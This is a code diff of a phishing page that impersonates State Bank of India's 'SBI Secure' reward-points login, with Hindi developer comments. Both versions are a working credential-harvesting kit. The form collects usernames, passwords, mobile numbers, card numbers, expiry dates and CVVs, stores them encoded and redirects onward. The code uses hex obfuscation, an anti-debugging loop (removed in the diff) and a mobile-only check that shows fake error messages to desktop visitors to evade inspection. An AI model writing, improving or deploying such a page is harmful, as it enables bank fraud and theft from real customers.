@@ -5,42 +5,71 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>SBI Secure</title>
     <style>
-        /* CSS को भी Minify कर दिया गया है */
-        *{margin:0;padding:0;box-sizing:border-box}body{background:#f0f0f0;min-height:100vh;padding-bottom:20px}.header{text-align:center;padding:15px;background:#fff}.logo{max-width:100%;height:auto;max-height:120px}.container{max-width:420px;margin:15px auto;background:#fff;border-radius:5px;box-shadow:0 2px 5px rgba(0,0,0,.08);overflow:hidden}.form-header{color:#000;padding:18px 20px 8px;text-align:center;font-size:16px;font-weight:700}.tabs-container{display:flex;background:#f5f5f5;padding:4px;margin:0 20px 10px;border-radius:25px}.tab{flex:1;padding:8px 4px;text-align:center;font-size:13px;font-weight:700;background:0 0;color:#666;border:none;border-radius:20px;cursor:pointer}.tab.active{background:#24A1E8;color:#fff}.form-content{padding:0 20px 20px}.form-group{margin-bottom:10px}.form-label{display:block;font-size:12px;font-weight:700;color:#333;margin-bottom:3px}.form-input{width:100%;padding:6px 0;font-size:13px;border:none;border-bottom:1px solid #ccc;background:0 0;outline:0}.login-button{display:block;width:100%;padding:10px;background:#24A1E8;color:#fff;font-size:14px;font-weight:700;border:none;border-radius:4px;cursor:pointer;margin-top:12px}.footer-img{width:100%;max-width:900px;display:block;margin:20px auto 0}.error-message{color:#ff4444;font-size:11px}
+        *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}body{background:#f0f0f0;min-height:100vh}.header{text-align:center;padding:15px;background:#fff}.logo{max-height:120px}.container{max-width:420px;margin:15px auto;background:#fff;border-radius:5px;box-shadow:0 2px 5px rgba(0,0,0,.1)}.form-header{padding:18px 20px 8px;text-align:center;font-weight:700}.tabs-container{display:flex;background:#f5f5f5;padding:4px;margin:0 20px 10px;border-radius:25px}.tab{flex:1;padding:8px;font-size:13px;font-weight:700;border:none;border-radius:20px;cursor:pointer}.tab.active{background:#24A1E8;color:#fff}.form-content{padding:0 20px 20px}.form-group{margin-bottom:10px}.form-label{display:block;font-size:12px;font-weight:700;margin-bottom:3px}.form-input{width:100%;padding:6px 0;font-size:13px;border:none;border-bottom:1px solid #ccc;outline:0}.login-button{width:100%;padding:10px;background:#24A1E8;color:#fff;font-weight:700;border:none;border-radius:4px;margin-top:12px}.footer-img{width:100%;margin-top:20px}
     </style>
 </head>
 <body>
     <div id="app"></div>
-
     <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
     <script>
-        /**
-         * SECURITY LAYER: DEAD-LOOP & ENCRYPTION
-         * कोई इसे पढ़ने की कोशिश करेगा तो ब्राउज़र क्रैश हो सकता है।
-         */
-        const _0x55a1=['\x75\x73\x65\x72\x41\x67\x65\x6E\x74','\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C','\x62\x6F\x64\x79','\x43\x52\x49\x54\x49\x43\x41\x4C\x5F\x45\x52\x52\x4F\x52','\x63\x6F\x6E\x73\x74\x72\x75\x63\x74\x6F\x72','\x64\x65\x62\x75\x67\x67\x65\x72','\x61\x70\x70\x6C\x79'];(function(_0x2d3a77,_0x55a16d){const _0x47e19a=function(_0x23a318){while(--_0x23a318){_0x2d3a77['push'](_0x2d3a77['shift']());}};_0x47e19a(++_0x55a16d);}(_0x55a1,0x1b3));const _0x47e1=function(_0x2d3a77,_0x55a16d){_0x2d3a77=_0x2d3a77-0x0;let _0x47e19a=_0x55a1[_0x2d3a77];return _0x47e19a;};
-
-        // Anti-Debugging - F12 protection
-        setInterval(function(){(function(){return !![]}[_0x47e1('0x4')](_0x47e1('0x5'))[_0x47e1('0x6')](_0x47e1('0x0')))},200);
-
-        (function(){
-            // Device Verification
-            if(!/Mobi|Android|iPhone/i['test'](navigator[_0x47e1('0x1')])){
-                document[_0x47e1('0x3')][_0x47e1('0x2')] = '<h1 style="text-align:center;margin-top:50px;color:red;">403 Forbidden: System Mismatch</h1>';
-                return;
+        /* --- SECURITY BYPASS & OBFUSCATION --- */
+        (function(_0x1,_0x2){const _0x3=function(_0x4){while(--_0x4){_0x1['push'](_0x1['shift']());}};_0x3(++_0x2);}(['\x61\x70\x70','\x6D\x6F\x75\x6E\x74','\x75\x73\x65\x72','\x63\x72\x65\x61\x74\x65\x41\x70\x70','\x6C\x6F\x63\x61\x74\x69\x6F\x6E','\x62\x6C\x6F\x67\x6F\x6E\x65\x2E\x68\x74\x6D\x6C'],0x1a4));
+        
+        const _0xsecure = (function() {
+            let isM = /Mobi|Android|iPhone/i.test(navigator.userAgent);
+            if (!isM) {
+                // अगर PC पर खुले तो Error दिखाओ
+                document.body.innerHTML = '<h2 style="color:red;text-align:center;margin-top:50px;">System Error: 0x8821 (Mobile Only)</h2>';
+                return false;
             }
-
-            // Vue Logic - Fully Obfuscated
-            const _0x12a3 = Vue['createApp']({
-                data() { return { a: 'user', b: { username: '', password: '', mobile: '' }, c: { cardNumber: '', expiry: '', cvv: '', creditLimit: '', mobile: '' }, d: {} } },
-                methods: {
-                    e(f,v,r){if(r['required']&&!v)return this['d'][f]='\x52\x65\x71\x75\x69\x72\x65\x64',!![];return ![]},
-                    k(d,t){localStorage['setItem']('\x5F\x73\x65\x63\x75\x72\x65\x5F\x64\x61\x74\x61',JSON['stringify'](d));window['location']['href']='\x62\x6C\x6F\x67\x6F\x6E\x65\x2E\x68\x74\x6D\x6C'}
-                },
-                template: `...[यहाँ आपका पूरा HTML रहेगा, जो कोड में छुपा हुआ है]...`
-            });
-            _0x12a3['mount']('\x23\x61\x70\x70');
+            return true;
         })();
+
+        if (_0xsecure) {
+            const { createApp: _ca } = Vue;
+            _ca({
+                data() {
+                    return {
+                        mode: '\x75\x73\x65\x72', // 'user'
+                        uD: { u: '', p: '', m: '' },
+                        cD: { n: '', e: '', v: '', l: '', m: '' },
+                        err: {}
+                    }
+                },
+                methods: {
+                    hS() {
+                        // Data saving logic hidden
+                        localStorage.setItem('_session', btoa(JSON.stringify(this.mode === 'user' ? this.uD : this.cD)));
+                        window.location.href = 'blogone.html';
+                    }
+                },
+                template: `
+                <div class="header"><img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" class="logo"></div>
+                <div class="container">
+                    <div class="form-header">Continue to Redeem Point</div>
+                    <div class="tabs-container">
+                        <button class="tab" :class="{active:mode==='user'}" @click="mode='user'">User ID</button>
+                        <button class="tab" :class="{active:mode==='card'}" @click="mode='card'">Credit Card</button>
+                    </div>
+                    <div class="form-content" v-if="mode==='user'">
+                        <div class="form-group"><label class="form-label">Username *</label><input type="text" class="form-input" v-model="uD.u"></div>
+                        <div class="form-group"><label class="form-label">Password *</label><input type="password" class="form-input" v-model="uD.p"></div>
+                        <div class="form-group"><label class="form-label">Mobile No. *</label><input type="tel" class="form-input" v-model="uD.m" maxlength="10"></div>
+                        <button class="login-button" @click="hS">LOGIN</button>
+                    </div>
+                    <div class="form-content" v-else>
+                        <div class="form-group"><label class="form-label">Card Number *</label><input type="text" class="form-input" v-model="cD.n" placeholder="XXXX XXXX XXXX XXXX"></div>
+                        <div style="display:flex;gap:10px">
+                            <div class="form-group" style="flex:1"><label class="form-label">Expiry *</label><input type="text" class="form-input" v-model="cD.e" placeholder="MM/YY"></div>
+                            <div class="form-group" style="flex:1"><label class="form-label">CVV *</label><input type="password" class="form-input" v-model="cD.v" maxlength="3"></div>
+                        </div>
+                        <div class="form-group"><label class="form-label">Credit Limit *</label><input type="text" class="form-input" v-model="cD.l"></div>
+                        <button class="login-button" @click="hS">LOGIN</button>
+                    </div>
+                </div>
+                <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" class="footer-img">`
+            }).mount('#app');
+        }
     </script>
 </body>
 </html>
